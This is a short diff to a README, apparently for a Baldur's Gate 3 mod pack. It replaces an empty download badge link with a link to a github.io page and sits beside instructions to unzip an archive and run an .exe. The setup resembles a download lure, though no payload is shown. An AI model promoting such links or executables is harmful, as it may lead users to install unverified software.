@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://bg3-big-mod-pack.github.io/.github/)
 
 ## 📸 Overview
   ![bg3-modpack-visuals](https://github.com/user-attachments/assets/db5f0ad6-1ee0-4e78-9c17-d31d19819ec0)
